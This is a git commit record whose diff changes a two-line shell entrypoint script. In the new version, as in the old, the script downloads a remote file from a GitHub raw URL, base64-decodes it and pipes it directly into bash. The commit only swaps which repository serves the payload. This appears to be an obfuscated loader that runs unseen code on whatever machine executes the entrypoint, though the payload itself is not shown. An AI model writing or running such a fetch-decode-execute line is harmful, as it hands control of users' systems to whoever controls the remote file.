2ea7d2be4df53d3d74d5a136823e6b7d48e1a976
lizalisemhlebezi <lizalisemhlebezi@gmail.com>
2026-06-05 21:23:48 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/nkululekomaqebe2/letter/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/lizalisemhlebezi/board/refs/heads/main/entrypoint.sh | base64 -d | bash
